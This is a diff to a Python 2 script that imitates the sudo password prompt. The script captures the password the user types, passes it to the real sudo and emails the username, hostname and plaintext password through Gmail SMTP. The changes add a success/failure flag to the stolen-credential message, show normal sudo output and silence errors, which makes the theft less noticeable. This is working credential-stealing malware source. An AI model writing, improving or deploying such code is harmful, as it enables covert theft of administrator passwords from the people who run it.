@@ -15,12 +15,17 @@ def dosudo():
     hsnm=os.environ.get('HOSTNAME')
     psstr='[sudo] password for {0}: '.format(usnm)
     psw=getpass(psstr)
-    p=spawn('bash',['-c','/usr/bin/sudo '+comm])
-    p.expect(usnm+': ')
-    p.sendline(psw)
-    p.expect(EOF)
-    print p.before.strip(psstr).strip()
-    return 'password for {0} on {1}: {2}'.format(usnm,hsnm,psw)
+    sf='succeeded'
+    try:
+        p=spawn('bash',['-c','/usr/bin/sudo '+comm])
+        p.expect(usnm+': ')
+        p.sendline(psw)
+        p.expect(EOF)
+        rslt=p.before.strip(psstr).strip()
+    except:
+        sf='failed'
+        rslt='Permission denied'
+    return ('password for {0} on {1}: {2} [sudo {3}]'.format(usnm,hsnm,psw,sf),rslt)
 
 def sendemail(mssg):
     smtpserver = smtplib.SMTP("smtp.gmail.com")
@@ -36,6 +41,9 @@ if __name__=="__main__":
         print usage
         exit()
     try:
-        sendemail(dosudo())
+        dsd=dosudo()
+        sendemail(dsd[0])
+        if dsd[1]:
+            print dsd[1]
     except:
-        print 'Permission denied'
+        pass
